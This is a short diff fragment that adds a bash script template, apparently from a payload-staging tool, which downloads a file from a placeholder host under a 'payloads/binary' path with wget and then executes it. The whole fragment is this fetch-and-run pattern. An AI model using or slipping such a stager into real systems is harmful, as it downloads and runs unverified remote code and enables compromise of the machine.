@@ -1,0 +1,3 @@
+#!/bin/bash
+wget %s/payloads/binary/%s -O %s
+./%s
